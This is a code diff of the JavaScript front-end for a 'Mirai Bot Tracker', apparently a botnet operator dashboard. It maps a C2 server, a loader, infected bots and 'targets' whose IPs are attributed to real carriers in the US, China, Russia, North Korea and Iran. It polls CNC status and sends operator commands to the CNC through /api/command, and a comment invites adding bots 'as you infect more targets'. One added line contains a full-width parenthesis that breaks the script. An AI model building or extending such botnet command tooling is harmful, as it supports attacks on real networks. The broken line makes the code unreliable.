@@ -1,10 +1,10 @@
 ﻿/* =============================================================
-   MIRAI BOT TRACKER v2.0 // app.js
-   - World map canvas (equirectangular)
-   - Matrix rain background
-   - Country infection dot system (random red dots in bot countries)
-   - Attack arc animation
-   - API polling
+   MIRAI BOT TRACKER v2.0 // app.js  (clean edition)
+   - No matrix rain
+   - No random infection dots
+   - Bots show ONLY at their fixed infected positions
+   - Labels only on hover (tooltip)
+   - Small green dots for bots (r=2), supports up to 2000 bots
    ============================================================= */
 "use strict";
 
@@ -12,48 +12,38 @@ const API_BASE    = "";
 const POLL_MS     = 5000;
 const LOG_POLL_MS = 3000;
 
-/* ---- LAB NODES ------------------------------------------- */
+/* ---- LAB NODES -------------------------------------------
+   type: "attacker" | "bot" | "victim"
+   Each bot appears as a small dot at its actual subnet position.
+   Add more bots here or feed dynamically from /api/geo.
+   ----------------------------------------------------------- */
 const LAB_NODES = [
-  { id:"c2",    type:"attacker", label:"C2/CNC",      ip:"185.10.20.100",  lat:48.80, lon:2.35,   country:"Lab" },
-  { id:"ldr",   type:"attacker", label:"LOADER",      ip:"185.10.20.200",  lat:48.85, lon:2.50,   country:"Lab" },
-  { id:"bot1",  type:"bot",  label:"BOT-1 [TH]",  ip:"110.164.20.11",  lat:13.75, lon:100.52, country:"Thailand",      countryKey:"TH" },
-  { id:"bot2",  type:"bot",  label:"BOT-2 [TH]",  ip:"125.20.30.11",   lat:14.00, lon:100.80, country:"Thailand",      countryKey:"TH" },
-  { id:"bot3",  type:"bot",  label:"BOT-3 [US]",  ip:"66.249.64.100",  lat:37.77, lon:-122.4, country:"USA",           countryKey:"US" },
-  { id:"bot4",  type:"bot",  label:"BOT-4 [KR]",  ip:"210.89.0.100",   lat:37.57, lon:126.97, country:"South Korea",   countryKey:"KR" },
-  { id:"bot5",  type:"bot",  label:"BOT-5 [CN]",  ip:"114.240.0.100",  lat:39.93, lon:116.38, country:"China",         countryKey:"CN" },
-  { id:"bot6",  type:"bot",  label:"BOT-6 [RU]",  ip:"95.24.0.100",    lat:55.75, lon:37.62,  country:"Russia",        countryKey:"RU" },
-  { id:"bot7",  type:"bot",  label:"BOT-7 [DE]",  ip:"46.112.0.100",   lat:52.52, lon:13.40,  country:"Germany",       countryKey:"DE" },
-  { id:"bot8",  type:"bot",  label:"BOT-8 [BR]",  ip:"177.0.0.100",    lat:-23.55,lon:-46.63, country:"Brazil",        countryKey:"BR" },
-  { id:"bot9",  type:"bot",  label:"BOT-9 [UK]",  ip:"8.2.0.100",      lat:51.51, lon:-0.12,  country:"United Kingdom",countryKey:"UK" },
-  { id:"bot10", type:"bot",  label:"BOT-10 [JP]", ip:"1.0.1.100",      lat:35.68, lon:139.69, country:"Japan",         countryKey:"JP" },
-  { id:"v_us",  type:"victim", label:"VICTIM:USA",    ip:"12.1.2.100",     lat:40.71, lon:-74.01, country:"USA (AT&T)",    victimKey:"us" },
-  { id:"v_cn",  type:"victim", label:"VICTIM:CN",     ip:"202.97.0.100",   lat:31.23, lon:121.47, country:"China (CT)",    victimKey:"cn" },
-  { id:"v_ru",  type:"victim", label:"VICTIM:RU",     ip:"217.107.0.100",  lat:59.93, lon:30.32,  country:"Russia (RT)",   victimKey:"ru" },
-  { id:"v_kp",  type:"victim", label:"VICTIM:KP",     ip:"175.45.176.100", lat:39.03, lon:125.75, country:"N.Korea",       victimKey:"kp" },
-  { id:"v_ir",  type:"victim", label:"VICTIM:IR",     ip:"5.200.0.100",    lat:35.69, lon:51.42,  country:"Iran (TCI)",    victimKey:"ir" },
+  // Attackers (C2 + Loader)
+  { id:"c2",    type:"attacker", label:"C2/CNC",      ip:"185.10.20.100",  lat:48.80, lon:2.35,   country:"Lab C2" },
+  { id:"ldr",   type:"attacker", label:"LOADER",      ip:"185.10.20.200",  lat:48.85, lon:2.50,   country:"Lab Loader" },
+
+  // Infected Bots (add more as you infect more targets)
+  { id:"bot1",  type:"bot", label:"BOT-1",  ip:"110.164.20.11",  lat:13.75, lon:100.52, country:"Thailand" },
+  { id:"bot2",  type:"bot", label:"BOT-2",  ip:"125.20.30.11",   lat:14.00, lon:100.80, country:"Thailand" },
+  { id:"bot3",  type:"bot", label:"BOT-3",  ip:"66.249.64.100",  lat:37.77, lon:-122.4, country:"USA" },
+  { id:"bot4",  type:"bot", label:"BOT-4",  ip:"210.89.0.100",   lat:37.57, lon:126.97, country:"South Korea" },
+  { id:"bot5",  type:"bot", label:"BOT-5",  ip:"114.240.0.100",  lat:39.93, lon:116.38, country:"China" },
+  { id:"bot6",  type:"bot", label:"BOT-6",  ip:"95.24.0.100",    lat:55.75, lon:37.62,  country:"Russia" },
+  { id:"bot7",  type:"bot", label:"BOT-7",  ip:"46.112.0.100",   lat:52.52, lon:13.40,  country:"Germany" },
+  { id:"bot8",  type:"bot", label:"BOT-8",  ip:"177.0.0.100",    lat:-23.55,lon:-46.63, country:"Brazil" },
+  { id:"bot9",  type:"bot", label:"BOT-9",  ip:"8.2.0.100",      lat:51.51, lon:-0.12,  country:"United Kingdom" },
+  { id:"bot10", type:"bot", label:"BOT-10", ip:"1.0.1.100",      lat:35.68, lon:139.69, country:"Japan" },
+
+  // Victims / Targets
+  { id:"v_us",  type:"victim", label:"TARGET:USA",    ip:"12.1.2.100",     lat:40.71, lon:-74.01, country:"USA (AT&T)",       victimKey:"us" },
+  { id:"v_cn",  type:"victim", label:"TARGET:CN",     ip:"202.97.0.100",   lat:31.23, lon:121.47, country:"China (CT)",       victimKey:"cn" },
+  { id:"v_ru",  type:"victim", label:"TARGET:RU",     ip:"217.107.0.100",  lat:59.93, lon:30.32,  country:"Russia (RT)",      victimKey:"ru" },
+  { id:"v_kp",  type:"victim", label:"TARGET:KP",     ip:"175.45.176.100", lat:39.03, lon:125.75, country:"N.Korea (Star)",   victimKey:"kp" },
+  { id:"v_ir",  type:"victim", label:"TARGET:IR",     ip:"5.200.0.100",    lat:35.69, lon:51.42,  country:"Iran (TCI)",       victimKey:"ir" },
 ];
 
 const VICTIM_MAP = {};
 LAB_NODES.filter(n => n.type === "victim").forEach(v => { VICTIM_MAP[v.victimKey] = v; });
-
-/* ---- COUNTRY BOUNDING BOXES [latMin,latMax,lonMin,lonMax] - */
-/* Used for spawning random infection dots within each country  */
-const COUNTRY_BOUNDS = {
-  TH: { latMin:5.5,  latMax:20.5, lonMin:97.3,  lonMax:105.7 },
-  US: { latMin:25.5, latMax:48.5, lonMin:-124,  lonMax:-67   },
-  KR: { latMin:34.3, latMax:38.3, lonMin:126,   lonMax:129.5 },
-  CN: { latMin:20,   latMax:52,   lonMin:78,    lonMax:132   },
-  RU: { latMin:51,   latMax:70,   lonMin:30,    lonMax:140   },
-  DE: { latMin:47.3, latMax:55,   lonMin:6.1,   lonMax:15.0  },
-  BR: { latMin:-33,  latMax:4,    lonMin:-73,   lonMax:-36   },
-  UK: { latMin:50,   latMax:58.5, lonMin:-8,    lonMax:1.8   },
-  JP: { latMin:30,   latMax:44,   lonMin:130,   lonMax:145   },
-};
-
-/* Map botId -> countryKey */
-const BOT_COUNTRIES = LAB_NODES
-  .filter(n => n.type === "bot" && n.countryKey)
-  .map(n => n.countryKey);
 
 /* ---- WORLD MAP POLYGONS [lat, lon] ----------------------- */
 const WORLD_POLYS = [
@@ -80,7 +70,7 @@ const WORLD_POLYS = [
     [78,-65],[80,-55],[83,-38]
   ]},
   { name:"southAmerica", pts:[
-    [11,-74],[8,-77],[8,-82],[8,-77],[8,-74],[1,-50],
+    [11,-74],[8,-77],[8,-82],[8,-74],[1,-50],
     [0,-50],[-1,-51],[-3,-41],[-5,-35],[-8,-35],
     [-12,-38],[-16,-39],[-20,-40],[-23,-43],[-25,-48],
     [-28,-49],[-32,-52],[-34,-54],[-38,-58],[-42,-65],
@@ -154,7 +144,7 @@ const WORLD_POLYS = [
 
 /* ---- PROJECTION ------------------------------------------ */
 function project(lat, lon, w, h) {
-  const ml=8,mr=8,mt=18,mb=15;
+  const ml=8, mr=8, mt=18, mb=12;
   const aw=w-ml-mr, ah=h-mt-mb;
   return {
     x: ml + (lon+180)/360 * aw,
@@ -173,164 +163,108 @@ function resize() {
   const r = canvas.parentElement.getBoundingClientRect();
   W = canvas.width  = Math.floor(r.width);
   H = canvas.height = Math.floor(r.height);
-  initMatrix();
 }
 
-/* ---- MATRIX RAIN ----------------------------------------- */
-const MATRIX_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>?][{}\\|/!;:=+-abcdefghijklmnopqrstuvwxyz".split("");
-const M_COL_W = 13;
-let mDrops = [];
-let mAge   = [];
+/* ---- NODE STYLE ------------------------------------------
+   bots: tiny (r=2) — supports 2000 individual dots
+   attackers: medium (r=6) — C2/Loader clearly visible
+   victims: medium-small (r=5) — red targets
+   ----------------------------------------------------------- */
+const NODE_STYLE = {
+  attacker: { fill:"#ffe033", glow:"#ffe03380", r:6  },
+  bot:      { fill:"#00ff41", glow:"#00ff4140", r:2  },
+  victim:   { fill:"#ff2222", glow:"#ff222280", r:5  },
+};
 
-function initMatrix() {
-  const cols = Math.ceil(W / M_COL_W);
-  mDrops = Array.from({length:cols}, () => -Math.floor(Math.random()*30));
-  mAge   = Array.from({length:cols}, () => 0);
-}
+/* ---- DRAW MAP -------------------------------------------- */
+function drawMap() {
+  // Black ocean
+  ctx.fillStyle = "#000";
+  ctx.fillRect(0,0,W,H);
 
-function drawMatrix() {
-  ctx.font = "11px Courier New,monospace";
-  ctx.textAlign = "center";
-  const cols = Math.ceil(W / M_COL_W);
-
-  for (let i=0; i<cols; i++) {
-    const x = i * M_COL_W + M_COL_W/2;
-    const y = mDrops[i] * 14;
-
-    if (y > 0 && y < H) {
-      // Head char (bright)
-      ctx.fillStyle = "#88ffaa";
-      ctx.shadowColor = "#00ff41";
-      ctx.shadowBlur = 4;
-      ctx.fillText(MATRIX_CHARS[Math.floor(Math.random()*MATRIX_CHARS.length)], x, y);
-      ctx.shadowBlur = 0;
-
-      // Trailing chars (fading)
-      const trailLen = 4 + Math.floor(Math.random()*4);
-      for (let j=1; j<=trailLen; j++) {
-        const ty = y - j*14;
-        if (ty < 0) break;
-        const fade = 1 - j/trailLen;
-        const alpha = fade * 0.25;
-        ctx.fillStyle = `rgba(0,${Math.floor(100*fade+60)},${Math.floor(20*fade)},${alpha})`;
-        ctx.fillText(MATRIX_CHARS[Math.floor(Math.random()*MATRIX_CHARS.length)], x, ty);
-      }
+  // Continent fills (dark green, very dark)
+  ctx.fillStyle = "#010e01";
+  for (const poly of WORLD_POLYS) {
+    ctx.beginPath();
+    let first=true;
+    for (const [lat,lon] of poly.pts) {
+      const {x,y} = project(lat,lon,W,H);
+      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
     }
+    ctx.closePath();
+    ctx.fill();
+  }
 
-    mDrops[i] += 0.6;
-    if (mDrops[i]*14 > H && Math.random() > 0.96) {
-      mDrops[i] = -Math.floor(Math.random()*15) - 5;
+  // Borders
+  ctx.strokeStyle = "#00880e";
+  ctx.lineWidth   = 0.6;
+  ctx.shadowColor = "#00ff4130";
+  ctx.shadowBlur  = 2;
+  for (const poly of WORLD_POLYS) {
+    ctx.beginPath();
+    let first=true;
+    for (const [lat,lon] of poly.pts) {
+      const {x,y}=project(lat,lon,W,H);
+      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
     }
+    ctx.closePath();
+    ctx.stroke();
   }
-  ctx.textAlign = "left";
+  ctx.shadowBlur = 0;
 }
 
-/* ---- INFECTION DOTS -------------------------------------- */
-/*
-  Each dot: { lat, lon, country, birthTime, duration, phase }
-  Phases:
-    0.00-0.15 : ALERT  -- bright red, fast blink
-    0.15-0.60 : ACTIVE -- solid red
-    0.60-1.00 : DYING  -- fade out to dark
-*/
-let infectionDots = [];
-let totalInfectCount = 0;
-
-function spawnInfectionDot(countryKey, delay=0) {
-  const b = COUNTRY_BOUNDS[countryKey];
-  if (!b) return;
-  setTimeout(() => {
-    const lat = b.latMin + Math.random()*(b.latMax - b.latMin);
-    const lon = b.lonMin + Math.random()*(b.lonMax - b.lonMin);
-    const dur = 12000 + Math.random()*18000; // 12-30s
-    infectionDots.push({ lat, lon, country:countryKey, birthTime:Date.now(), duration:dur });
-    totalInfectCount++;
-    const el = document.getElementById("sb-infect-count");
-    if (el) el.textContent = totalInfectCount;
-    termLog(`[INF] NEW_BOT country=${countryKey} pos=${lat.toFixed(2)},${lon.toFixed(2)}`, "inf");
-  }, delay);
-}
-
-function spawnBurst(countryKey, count=2) {
-  for (let i=0; i<count; i++) {
-    spawnInfectionDot(countryKey, i * (200 + Math.random()*400));
-  }
-}
-
-function drawInfectionDots() {
+/* ---- DRAW NODES ------------------------------------------ */
+function drawNodes() {
+  projNodes = [];
   const now = Date.now();
-  const live = [];
 
-  for (const dot of infectionDots) {
-    const age  = now - dot.birthTime;
-    if (age > dot.duration) continue;
-    live.push(dot);
+  for (const node of LAB_NODES) {
+    const {x,y} = project(node.lat, node.lon, W, H);
+    const s = NODE_STYLE[node.type];
 
-    const prog = age / dot.duration;
-    const {x,y} = project(dot.lat, dot.lon, W, H);
+    if (node.type === "bot") {
+      /* ------ SMALL BOT DOT (tiny, clean, supports 2000+) ------ */
+      ctx.beginPath();
+      ctx.arc(x, y, s.r, 0, Math.PI*2);
+      ctx.fillStyle   = s.fill;
+      ctx.shadowColor = "#00ff41";
+      ctx.shadowBlur  = 3;
+      ctx.fill();
+      ctx.shadowBlur  = 0;
+      // Hit area slightly larger than visual dot for hover
+      projNodes.push({...node, px:x, py:y, hr:6});
 
-    let alpha, radius, col;
-
-    if (prog < 0.15) {
-      // ALERT: fast red blink
-      const blink = Math.sin(now / 80) * 0.5 + 0.5;
-      alpha  = 0.6 + blink*0.4;
-      radius = 3 + blink*1.5;
-      col    = "#ff0000";
-    } else if (prog < 0.6) {
-      // ACTIVE: solid red dot
-      alpha  = 0.85;
-      radius = 2.5;
-      col    = "#ff2222";
     } else {
-      // DYING: fade
-      alpha  = (1 - (prog-0.6)/0.4) * 0.6;
-      radius = 2;
-      col    = "#aa1111";
+      /* ------ ATTACKER / VICTIM (larger, with glow halo) ------- */
+      // Outer halo
+      ctx.beginPath();
+      ctx.arc(x,y,s.r+4,0,Math.PI*2);
+      ctx.fillStyle = s.glow;
+      ctx.fill();
+
+      // Core dot
+      ctx.beginPath();
+      ctx.arc(x,y,s.r,0,Math.PI*2);
+      ctx.fillStyle   = s.fill;
+      ctx.shadowColor = s.fill;
+      ctx.shadowBlur  = 12;
+      ctx.fill();
+      ctx.shadowBlur  = 0;
+
+      // Pulsing ring (only for non-bots)
+      const phase = ((now/1500) + node.lat*0.07) % 1;
+      const pr    = s.r + 3 + phase*10;
+      const pa    = 1 - phase;
+      ctx.beginPath();
+      ctx.arc(x,y,pr,0,Math.PI*2);
+      ctx.strokeStyle = s.fill + Math.floor(pa*180).toString(16).padStart(2,"0");
+      ctx.lineWidth = 1;
+      ctx.stroke();
+
+      projNodes.push({...node, px:x, py:y, hr:s.r+10});
     }
-
-    ctx.save();
-    ctx.globalAlpha = alpha;
-
-    // Outer glow
-    ctx.beginPath();
-    ctx.arc(x, y, radius+3, 0, Math.PI*2);
-    ctx.fillStyle = col + "30";
-    ctx.fill();
-
-    // Core dot
-    ctx.beginPath();
-    ctx.arc(x, y, radius, 0, Math.PI*2);
-    ctx.fillStyle = col;
-    ctx.shadowColor = col;
-    ctx.shadowBlur = prog < 0.15 ? 10 : 5;
-    ctx.fill();
-    ctx.shadowBlur = 0;
-
-    ctx.restore();
-  }
-
-  infectionDots = live;
-}
-
-/* ---- AUTO-SPAWN INFECTION DEMO --------------------------- */
-function autoSpawnDemo() {
-  // Pick 1-2 random bot countries and spawn dots
-  const keys = Object.keys(COUNTRY_BOUNDS);
-  const n = 1 + Math.floor(Math.random() * 2);
-  for (let i=0; i<n; i++) {
-    const k = keys[Math.floor(Math.random()*keys.length)];
-    spawnInfectionDot(k, i * 800 + Math.random()*600);
   }
 }
-// Spawn initial dots on load
-setTimeout(() => {
-  Object.keys(COUNTRY_BOUNDS).forEach((k,i) => {
-    spawnInfectionDot(k, 500 + i*400);
-  });
-}, 2000);
-// Periodic auto-spawn
-setInterval(autoSpawnDemo, 6000);
 
 /* ---- ATTACK ARCS ----------------------------------------- */
 function bezierPt(p0,p1,p2,t){ return (1-t)*(1-t)*p0 + 2*(1-t)*t*p1 + t*t*p2; }
@@ -349,137 +283,39 @@ function drawArcs() {
     const mx = (fx+tx)/2;
     const my = (fy+ty)/2 - Math.hypot(tx-fx,ty-fy)*0.36;
     const prog = Math.min(age/arc.duration, 1);
-
     const ex = bezierPt(fx,mx,tx,prog);
     const ey = bezierPt(fy,my,ty,prog);
 
     ctx.save();
     ctx.strokeStyle = "#ff2222";
-    ctx.lineWidth   = 1.2;
+    ctx.lineWidth   = 1;
     ctx.shadowColor = "#ff2222";
     ctx.shadowBlur  = 6;
-    ctx.setLineDash([5,4]);
-    ctx.lineDashOffset = -(now/35) % 9;
-
-    ctx.beginPath();
-    ctx.moveTo(fx,fy);
+    ctx.setLineDash([4,4]);
+    ctx.lineDashOffset = -(now/35) % 8;
+    ctx.beginPath(); ctx.moveTo(fx,fy);
     ctx.quadraticCurveTo(mx,my,ex,ey);
     ctx.stroke();
     ctx.setLineDash([]);
-
-    ctx.beginPath();
-    ctx.arc(ex,ey,2.5,0,Math.PI*2);
-    ctx.fillStyle="#ff5555";
-    ctx.fill();
+    ctx.beginPath(); ctx.arc(ex,ey,2,0,Math.PI*2);
+    ctx.fillStyle="#ff5555"; ctx.fill();
     ctx.restore();
   }
+
   arcs = live;
-}
-
-/* ---- DRAW MAP -------------------------------------------- */
-function drawMap() {
-  ctx.fillStyle = "#000008";
-  ctx.fillRect(0,0,W,H);
-
-  // Matrix rain (ocean areas)
-  drawMatrix();
-
-  // Continent fills (solid, over rain)
-  for (const poly of WORLD_POLYS) {
-    ctx.beginPath();
-    let first=true;
-    for (const [lat,lon] of poly.pts) {
-      const {x,y} = project(lat,lon,W,H);
-      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
-    }
-    ctx.closePath();
-    ctx.fillStyle = "#010d01";
-    ctx.fill();
-  }
-
-  // Continent borders
-  ctx.strokeStyle = "#009a18";
-  ctx.lineWidth   = 0.7;
-  ctx.shadowColor = "#00ff4140";
-  ctx.shadowBlur  = 2;
-  for (const poly of WORLD_POLYS) {
-    ctx.beginPath();
-    let first=true;
-    for (const [lat,lon] of poly.pts) {
-      const {x,y} = project(lat,lon,W,H);
-      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
-    }
-    ctx.closePath();
-    ctx.stroke();
-  }
-  ctx.shadowBlur = 0;
-}
-
-/* ---- DRAW NODES ------------------------------------------ */
-const NODE_STYLE = {
-  attacker:{ fill:"#ffe033", glow:"#ffe03380", r:6 },
-  bot:     { fill:"#00ff41", glow:"#00ff4180", r:4 },
-  victim:  { fill:"#ff2222", glow:"#ff222280", r:5 },
-};
-
-function drawNodes() {
-  projNodes = [];
-  const now = Date.now();
-
-  for (const node of LAB_NODES) {
-    const {x,y} = project(node.lat, node.lon, W, H);
-    const s = NODE_STYLE[node.type];
-
-    // Halo
-    ctx.beginPath(); ctx.arc(x,y,s.r+3,0,Math.PI*2);
-    ctx.fillStyle=s.glow; ctx.fill();
-
-    // Core
-    ctx.beginPath(); ctx.arc(x,y,s.r,0,Math.PI*2);
-    ctx.fillStyle   = s.fill;
-    ctx.shadowColor = s.fill;
-    ctx.shadowBlur  = 10;
-    ctx.fill();
-    ctx.shadowBlur  = 0;
-
-    // Pulse ring
-    const phase = ((now/1600) + node.lat*0.08) % 1;
-    const pr    = s.r + 2 + phase*9;
-    const pa    = 1 - phase;
-    ctx.beginPath(); ctx.arc(x,y,pr,0,Math.PI*2);
-    ctx.strokeStyle = s.fill + Math.floor(pa*200).toString(16).padStart(2,"0");
-    ctx.lineWidth=0.8; ctx.stroke();
-
-    projNodes.push({...node, px:x, py:y, hr:s.r+7});
-  }
-}
-
-/* ---- DRAW LABELS ----------------------------------------- */
-function drawLabels() {
-  ctx.font = "8px Courier New,monospace";
-  ctx.textAlign = "left";
-  for (const n of projNodes) {
-    const s = NODE_STYLE[n.type];
-    ctx.fillStyle   = s.fill;
-    ctx.shadowColor = s.fill;
-    ctx.shadowBlur  = 3;
-    ctx.fillText(n.label, n.px + n.hr, n.py + 3);
-    ctx.shadowBlur = 0;
-  }
 }
 
 /* ---- MAIN DRAW LOOP -------------------------------------- */
 function drawFrame() {
   ctx.clearRect(0,0,W,H);
-  drawMap();
-  drawInfectionDots();
-  drawArcs();
-  drawNodes();
-  drawLabels();
+  drawMap();      // map only, no rain
+  drawArcs();     // attack lines
+  drawNodes();    // bots + victims + c2/loader
+  // NO drawLabels() — labels only via hover tooltip
   requestAnimationFrame(drawFrame);
 }
 
-/* ---- TOOLTIP --------------------------------------------- */
+/* ---- TOOLTIP (only info display on map) ------------------ */
 const tooltip = document.getElementById("node-tooltip");
 const ttTitle = document.getElementById("tt-title");
 const ttIp    = document.getElementById("tt-ip");
@@ -489,25 +325,31 @@ canvas.addEventListener("mousemove", e => {
   const r  = canvas.getBoundingClientRect();
   const mx = e.clientX - r.left;
   const my = e.clientY - r.top;
+
+  // Find nearest node within hit radius
   let hit = null;
+  let bestDist = Infinity;
   for (const n of projNodes) {
-    if (Math.hypot(mx-n.px, my-n.py) < n.hr) { hit=n; break; }
+    const d = Math.hypot(mx-n.px, my-n.py);
+    if (d < n.hr && d < bestDist) { hit=n; bestDist=d; }
   }
+
   if (hit) {
-    ttTitle.textContent = "NODE:" + hit.label;
-    ttIp.textContent    = "IP:" + hit.ip;
-    ttRole.textContent  = hit.country + " [" + hit.type.toUpperCase() + "]";
+    ttTitle.textContent = hit.label;
+    ttIp.textContent    = "IP: " + hit.ip;
+    ttRole.textContent  = hit.country + "  [" + hit.type.toUpperCase() + "]";
     ttRole.style.color  = NODE_STYLE[hit.type].fill;
-    let tx = mx+12; if(tx+170>W) tx=mx-175;
-    tooltip.style.left = tx+"px";
-    tooltip.style.top  = (my-8)+"px";
+    let tx = mx + 14;
+    if (tx + 170 > W) tx = mx - 180;
+    tooltip.style.left = tx + "px";
+    tooltip.style.top  = (my - 10) + "px";
   } else {
     tooltip.style.top = "-999px";
   }
 });
 canvas.addEventListener("mouseleave",()=>{ tooltip.style.top="-999px"; });
 
-/* ---- FIRE ARCS ------------------------------------------- */
+/* ---- FIRE ATTACK ARCS ------------------------------------ */
 function fireArcs(victimKey, duration) {
   const victim = VICTIM_MAP[victimKey];
   if (!victim) return;
@@ -516,36 +358,37 @@ function fireArcs(victimKey, duration) {
   const t0   = Date.now();
   bots.forEach((bot,i) => {
     const {x:fx,y:fy} = project(bot.lat,bot.lon,W,H);
-    arcs.push({
-      fx,fy,tx,ty,
-      startTime: t0 + i*100,
-      duration: Math.max(duration/3, 4),
-    });
+    arcs.push({ fx,fy,tx,ty, startTime:t0+i*90, duration:Math.max(duration/3,3) });
   });
 }
 
-/* ---- NODE LIST ------------------------------------------- */
+/* ---- NODE LIST SIDEBAR ----------------------------------- */
 function buildNodeList() {
   const list = document.getElementById("node-list");
+  if (!list) return;
   list.innerHTML = "";
+  const count = document.getElementById("sb-node-count");
+  if (count) count.textContent = LAB_NODES.length;
+
   for (const node of LAB_NODES) {
     const div = document.createElement("div");
     div.className = "nl-item";
-    div.title = node.ip+" -- "+node.country;
+    div.title = node.ip + " -- " + node.country;
     div.innerHTML =
       "<span class='nl-dot dot-"+node.type+"'></span>"+
       "<span class='nl-name'>"+node.label+"</span>"+
       "<span class='nl-ip'>"+node.ip+"</span>";
     div.addEventListener("click", () => {
-      // Flash circle at node location
+      // Flash ring at this node's map position
       const {x,y} = project(node.lat, node.lon, W, H);
       let n=0;
       const id=setInterval(()=>{
-        if(n++>5){clearInterval(id);return;}
-        ctx.beginPath();ctx.arc(x,y,16+n*5,0,Math.PI*2);
-        ctx.strokeStyle=NODE_STYLE[node.type].fill+"60";
-        ctx.lineWidth=1.5;ctx.stroke();
-      },70);
+        if(n++>6){clearInterval(id);return;}
+        ctx.beginPath();
+        ctx.arc(x,y,10+n*5,0,Math.PI*2);
+        ctx.strokeStyle=NODE_STYLE[node.type].fill+"50";
+        ctx.lineWidth=1.5; ctx.stroke();
+      },60);
     });
     list.appendChild(div);
   }
@@ -563,7 +406,8 @@ document.querySelectorAll(".tab").forEach(btn=>{
 
 /* ---- CLOCK ----------------------------------------------- */
 function updateClock(){
-  document.getElementById("hdr-clock").textContent = new Date().toTimeString().slice(0,8);
+  const el=document.getElementById("hdr-clock");
+  if(el) el.textContent=new Date().toTimeString().slice(0,8);
 }
 setInterval(updateClock,1000); updateClock();
 
@@ -579,6 +423,7 @@ function toast(msg, err=false){
 /* ---- TERMINAL LOG ---------------------------------------- */
 function termLog(msg, cls="sys"){
   const term=document.getElementById("terminal");
+  if(!term) return;
   const line=document.createElement("div");
   line.className="tline "+cls;
   line.textContent=msg;
@@ -586,41 +431,41 @@ function termLog(msg, cls="sys"){
   term.scrollTop=term.scrollHeight;
   while(term.children.length>200) term.removeChild(term.firstChild);
 }
-document.getElementById("btn-clear-log").addEventListener("click",()=>{
-  document.getElementById("terminal").innerHTML="";
-});
+const clrBtn=document.getElementById("btn-clear-log");
+if(clrBtn) clrBtn.addEventListener("click",()=>{ document.getElementById("terminal").innerHTML=""; });
 
-/* ---- STATUS APPLY ---------------------------------------- */
-let _lastBotTotal = 0;
+/* ---- APPLY STATUS ---------------------------------------- */
+let _lastBotTotal=0;
 
 function applyStatus(data){
   const cncUp = !!data.cnc_up;
   const bots  = data.bot_total ?? 0;
   const peers = data.tcp_peers ?? "--";
 
-  // Detect bot count increase -> spawn infection events
-  if (bots > _lastBotTotal && _lastBotTotal >= 0) {
-    const diff = bots - _lastBotTotal;
-    // Spawn dots across random bot countries
-    for(let i=0;i<Math.min(diff,3);i++){
-      const k = BOT_COUNTRIES[Math.floor(Math.random()*BOT_COUNTRIES.length)];
-      spawnBurst(k, 1+Math.floor(Math.random()*2));
-    }
+  if (bots > _lastBotTotal) {
+    // Bot count went up — log it (no random dots)
+    termLog("[BOT] +"+（bots-_lastBotTotal)+" new bots. total="+bots,"ok");
   }
   _lastBotTotal = bots;
 
-  document.getElementById("hdr-bot-count").textContent = String(bots).padStart(3,"0");
-  document.getElementById("hdr-peers").textContent = peers;
+  const elCount=document.getElementById("hdr-bot-count");
+  if(elCount) elCount.textContent=String(bots).padStart(3,"0");
+  const elPeers=document.getElementById("hdr-peers");
+  if(elPeers) elPeers.textContent=peers;
 
-  const chip = document.getElementById("hdr-cnc-status");
-  chip.textContent = cncUp?"[CNC:UP]":"[CNC:DOWN]";
-  chip.className   = "hdr-chip "+(cncUp?"chip-up":"chip-down");
+  const chip=document.getElementById("hdr-cnc-status");
+  if(chip){ chip.textContent=cncUp?"[CNC:UP]":"[CNC:DOWN]"; chip.className="hdr-chip "+(cncUp?"chip-up":"chip-down"); }
 
-  document.getElementById("led-cnc").className = "led"+(cncUp?" on":"");
-  document.getElementById("sb-cnc-text").textContent = cncUp?"UP":"DOWN";
-  document.getElementById("sb-bot-text").textContent = bots;
-  document.getElementById("led-bots").className = "led"+(bots>0?" on":"");
-  document.getElementById("sb-last-poll").textContent = new Date().toTimeString().slice(0,8);
+  const ledCnc=document.getElementById("led-cnc");
+  if(ledCnc) ledCnc.className="led"+(cncUp?" on":"");
+  const sbCnc=document.getElementById("sb-cnc-text");
+  if(sbCnc) sbCnc.textContent=cncUp?"UP":"DOWN";
+  const sbBot=document.getElementById("sb-bot-text");
+  if(sbBot) sbBot.textContent=bots;
+  const ledBots=document.getElementById("led-bots");
+  if(ledBots) ledBots.className="led"+(bots>0?" on":"");
+  const sbPoll=document.getElementById("sb-last-poll");
+  if(sbPoll) sbPoll.textContent=new Date().toTimeString().slice(0,8);
 
   if(data.error && !cncUp) termLog("[ERR] "+data.error,"err");
 }
@@ -651,10 +496,14 @@ async function pollOverview(){
     const d=await r.json();
     const agentOk=d.loader_agent?.ok;
     const httpOk=d.loader?.http?.running;
-    document.getElementById("led-agent").className="led led-yellow"+(agentOk?" on":"");
-    document.getElementById("sb-agent-text").textContent=agentOk?"UP":"DOWN";
-    document.getElementById("led-http").className="led led-blue"+(httpOk?" on":"");
-    document.getElementById("sb-http-text").textContent=httpOk?"UP":"DOWN";
+    const la=document.getElementById("led-agent");
+    if(la) la.className="led led-yellow"+(agentOk?" on":"");
+    const sa=document.getElementById("sb-agent-text");
+    if(sa) sa.textContent=agentOk?"UP":"DOWN";
+    const lh=document.getElementById("led-http");
+    if(lh) lh.className="led led-blue"+(httpOk?" on":"");
+    const sh=document.getElementById("sb-http-text");
+    if(sh) sh.textContent=httpOk?"UP":"DOWN";
   }catch{}
 }
 
@@ -663,7 +512,7 @@ async function sendCommand(cmd){
   if(!cmd.trim()) return;
   termLog("[CMD] >> "+cmd,"cmd");
   const out=document.getElementById("cmd-output");
-  out.textContent="> SENDING...";
+  if(out) out.textContent="> SENDING...";
   try{
     const r=await fetch(API_BASE+"/api/command",{
       method:"POST",headers:{"Content-Type":"application/json"},
@@ -671,27 +520,24 @@ async function sendCommand(cmd){
     });
     const d=await r.json();
     const txt=d.response||(d.error?"[ERR] "+d.error:"[no output]");
-    out.textContent=txt;
-    if(d.bot_total!==undefined)
-      document.getElementById("hdr-bot-count").textContent=String(d.bot_total).padStart(3,"0");
+    if(out) out.textContent=txt;
+    if(d.bot_total!==undefined){
+      const el=document.getElementById("hdr-bot-count");
+      if(el) el.textContent=String(d.bot_total).padStart(3,"0");
+    }
     termLog("[CNC] "+txt.slice(0,120),d.ok?"ok":"err");
